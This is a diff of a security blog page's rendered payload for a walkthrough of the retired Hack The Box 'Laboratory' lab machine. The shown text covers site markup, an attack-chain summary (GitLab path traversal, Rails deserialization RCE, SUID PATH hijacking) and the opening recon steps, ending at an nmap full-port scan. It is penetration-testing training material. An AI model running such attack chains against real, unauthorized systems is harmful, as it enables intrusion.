@@ -4,8 +4,8 @@
 4:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 5:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
 12:I[7123,[],"default",1]
-:HL["/_next/static/css/2377371a6300f138.css","style"]
-0:{"P":null,"c":["","writing","hackthebox-laboratory-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-laboratory-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/2377371a6300f138.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"zs2c_HJI2CXWwLDIPVraL"}
+:HL["/_next/static/css/8149d5cedd00bf59.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-laboratory-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-laboratory-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/8149d5cedd00bf59.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"EBRi0HxexS1XMGpfUl_9d"}
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
 19:I[484,[],"ViewportBoundary"]
@@ -24,46 +24,45 @@ f:["$","$1","c",{"children":["$L14",null,["$","$L15",null,{"children":["$","$16"
 10:"$W18"
 11:["$","$1","h",{"children":[null,["$","$L19",null,{"children":"$L1a"}],["$","div",null,{"hidden":true,"children":["$","$L1b",null,{"children":["$","$16",null,{"name":"Next.Metadata","children":"$L1c"}]}]}],null]}]
 :HL["/writing/covers/hackthebox-laboratory-walkthrough.webp","image"]
-14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Laboratory Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Laboratory machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:55:01.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[14," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-laboratory-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Laboratory machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Laboratory machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/laboratory","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","the-mindset-before-you-start",{"children":["$","a",null,{"href":"#the-mindset-before-you-start","children":"The Mindset Before You Start"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1 — Reconnaissance"}]}],["$","li","phase-2-enumeration",{"children":["$","a",null,{"href":"#phase-2-enumeration","children":"Phase 2 — Enumeration"}]}],["$","li","phase-3-exploitation-getting-a-foothold",{"children":["$","a",null,{"href":"#phase-3-exploitation-getting-a-foothold","children":"Phase 3 — Exploitation (Getting a Foothold)"}]}],["$","li","phase-4-post-exploitation-inside-the-container",{"children":["$","a",null,{"href":"#phase-4-post-exploitation-inside-the-container","children":"Phase 4 — Post-Exploitation (Inside the Container)"}]}],["$","li","phase-5-accessing-the-host-machine",{"children":"$L1d"}],"$L1e","$L1f","$L20"]}]]}],"$L21"],"$L22","$L23",["$L24","$L25","$L26"]]}],"$L27"]}]]}],"$L28"]}],"$L29","$L2a"]
-1d:["$","a",null,{"href":"#phase-5-accessing-the-host-machine","children":"Phase 5 — Accessing the Host Machine"}]
-1e:["$","li","phase-6-privilege-escalation-user-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-user-to-root","children":"Phase 6 — Privilege Escalation (User to Root)"}]}]
+14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Laboratory Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Authenticated GitLab path traversal leaks the Rails signing secret for deserialization RCE, private project data provides host SSH access, and a SUID binary's relative command call enables PATH hijacking to root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T12:55:01.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[14," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-laboratory-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Laboratory machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Laboratory machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/laboratory","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","before-you-start",{"children":["$","a",null,{"href":"#before-you-start","children":"Before you start"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-enumeration",{"children":["$","a",null,{"href":"#phase-2-enumeration","children":"Phase 2: Enumeration"}]}],["$","li","phase-3-exploitation-getting-a-foothold",{"children":["$","a",null,{"href":"#phase-3-exploitation-getting-a-foothold","children":"Phase 3: Exploitation (Getting a Foothold)"}]}],["$","li","phase-4-post-exploitation-inside-the-container",{"children":["$","a",null,{"href":"#phase-4-post-exploitation-inside-the-container","children":"Phase 4: Post-Exploitation (Inside the Container)"}]}],["$","li","phase-5-accessing-the-host-machine",{"children":"$L1d"}],"$L1e","$L1f","$L20"]}]]}],"$L21"],"$L22","$L23",["$L24","$L25","$L26"]]}],"$L27"]}]]}],"$L28"]}],"$L29","$L2a"]
+1d:["$","a",null,{"href":"#phase-5-accessing-the-host-machine","children":"Phase 5: Accessing the Host Machine"}]
+1e:["$","li","phase-6-privilege-escalation-user-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-user-to-root","children":"Phase 6: Privilege Escalation (User to Root)"}]}]
 1f:["$","li","summary-of-the-full-attack-chain",{"children":["$","a",null,{"href":"#summary-of-the-full-attack-chain","children":"Summary of the Full Attack Chain"}]}]
 20:["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons and Takeaways"}]}]
-21:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",9," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","the-mindset-before-you-start",{"children":["$","a",null,{"href":"#the-mindset-before-you-start","children":"The Mindset Before You Start"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1 — Reconnaissance"}]}],["$","li","phase-2-enumeration",{"children":["$","a",null,{"href":"#phase-2-enumeration","children":"Phase 2 — Enumeration"}]}],["$","li","phase-3-exploitation-getting-a-foothold",{"children":["$","a",null,{"href":"#phase-3-exploitation-getting-a-foothold","children":"Phase 3 — Exploitation (Getting a Foothold)"}]}],["$","li","phase-4-post-exploitation-inside-the-container",{"children":["$","a",null,{"href":"#phase-4-post-exploitation-inside-the-container","children":"Phase 4 — Post-Exploitation (Inside the Container)"}]}],["$","li","phase-5-accessing-the-host-machine",{"children":["$","a",null,{"href":"#phase-5-accessing-the-host-machine","children":"Phase 5 — Accessing the Host Machine"}]}],["$","li","phase-6-privilege-escalation-user-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-user-to-root","children":"Phase 6 — Privilege Escalation (User to Root)"}]}],["$","li","summary-of-the-full-attack-chain",{"children":["$","a",null,{"href":"#summary-of-the-full-attack-chain","children":"Summary of the Full Attack Chain"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons and Takeaways"}]}]]}]}]]}]
-22:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/f73400434e3214a8b51a311c71fd49332ca5c718/HTB-Laboratory.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · f73400434e32",""]}]]]}]
-23:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Laboratory"," · Linux"," · Easy"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/laboratory","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+21:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",9," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","before-you-start",{"children":["$","a",null,{"href":"#before-you-start","children":"Before you start"}]}],["$","li","phase-1-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-reconnaissance","children":"Phase 1: Reconnaissance"}]}],["$","li","phase-2-enumeration",{"children":["$","a",null,{"href":"#phase-2-enumeration","children":"Phase 2: Enumeration"}]}],["$","li","phase-3-exploitation-getting-a-foothold",{"children":["$","a",null,{"href":"#phase-3-exploitation-getting-a-foothold","children":"Phase 3: Exploitation (Getting a Foothold)"}]}],["$","li","phase-4-post-exploitation-inside-the-container",{"children":["$","a",null,{"href":"#phase-4-post-exploitation-inside-the-container","children":"Phase 4: Post-Exploitation (Inside the Container)"}]}],["$","li","phase-5-accessing-the-host-machine",{"children":["$","a",null,{"href":"#phase-5-accessing-the-host-machine","children":"Phase 5: Accessing the Host Machine"}]}],["$","li","phase-6-privilege-escalation-user-to-root",{"children":["$","a",null,{"href":"#phase-6-privilege-escalation-user-to-root","children":"Phase 6: Privilege Escalation (User to Root)"}]}],["$","li","summary-of-the-full-attack-chain",{"children":["$","a",null,{"href":"#summary-of-the-full-attack-chain","children":"Summary of the Full Attack Chain"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons and Takeaways"}]}]]}]}]]}]
+22:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/f73400434e3214a8b51a311c71fd49332ca5c718/HTB-Laboratory.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit f73400434e32",""]}]]]}]
+23:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Laboratory, Linux, Easy",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/laboratory","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 24:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Laboratory machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-25:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+25:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
 26:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"5 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-2b:T610b,
-<p><strong>Difficulty:</strong> Easy | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.12.122</p>
-<hr />
-<h2 id="the-mindset-before-you-start">The Mindset Before You Start</h2>
-<p>Every machine on HackTheBox (and in real pentests) follows a repeatable mental model:</p>
+2b:T5ea1,<p><strong>Difficulty:</strong> Easy | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.12.122</p>
+<hr>
+<h2 id="before-you-start">Before you start</h2>
+<p>Use a repeatable process:</p>
 <ol>
-<li><strong>Reconnaissance</strong> — figure out what's running</li>
-<li><strong>Enumeration</strong> — dig deeper into what you find</li>
-<li><strong>Exploitation</strong> — abuse a vulnerability to get access</li>
-<li><strong>Post-Exploitation</strong> — move laterally and escalate privileges</li>
+<li><strong>Reconnaissance</strong> : figure out what's running</li>
+<li><strong>Enumeration</strong> : dig deeper into what you find</li>
+<li><strong>Exploitation</strong> : abuse a vulnerability to get access</li>
+<li><strong>Post-Exploitation</strong> : move laterally and escalate privileges</li>
 </ol>
-<p>You always start from zero knowledge and build your picture of the target incrementally. The goal is to find the weakest link — the thing the machine owner forgot to lock down.</p>
-<hr />
-<h2 id="phase-1-reconnaissance">Phase 1 — Reconnaissance</h2>
+<p>Build the target picture incrementally and test each exposed trust boundary.</p>
+<hr>
+<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
 <h3 id="step-1-update-etc-hosts">Step 1: Update /etc/hosts</h3>
 <p>Before scanning, we set our attacker IP as a variable for convenience:</p>
 <pre><code>Attacker IP: 10.10.16.84
 Target IP:   10.129.12.122
 </code></pre>
-<p><strong>Why?</strong> On HTB machines, web servers often use virtual hosting — they serve different content depending on the <code>Host:</code> header in HTTP requests. If you just browse to the IP, you might miss entire sites. We need the hostnames to access those virtual hosts.</p>
-<hr />
-<h3 id="step-2-nmap-port-scan-find-open-doors">Step 2: Nmap Port Scan — Find Open Doors</h3>
+<p><strong>Why?</strong> On HTB machines, web servers often use virtual hosting - they serve different content depending on the <code>Host:</code> header in HTTP requests. If you just browse to the IP, you might miss entire sites. We need the hostnames to access those virtual hosts.</p>
+<hr>
+<h3 id="step-2-nmap-port-scan-find-open-doors">Step 2: Nmap Port Scan: Find Open Doors</h3>
 <pre><code class="language-bash" data-language="bash">sudo nmap -p- --min-rate 10000 -oA lab-alltcp 10.129.12.122
 </code></pre>
 <p><strong>What this does:</strong></p>
 <ul>
-<li><code>-p-</code> — scan ALL 65535 ports, not just the common 1000</li>
-<li><code>--min-rate 10000</code> — send at least 10,000 packets per second (fast)</li>
-<li><code>-oA</code> — save output in all formats for later reference</li>
+<li><code>-p-</code> : scan ALL 65535 ports, not just the common 1000</li>
+<li><code>--min-rate 10000</code> : send at least 10,000 packets per second (fast)</li>
+<li><code>-oA</code> : save output in all formats for later reference</li>
 </ul>
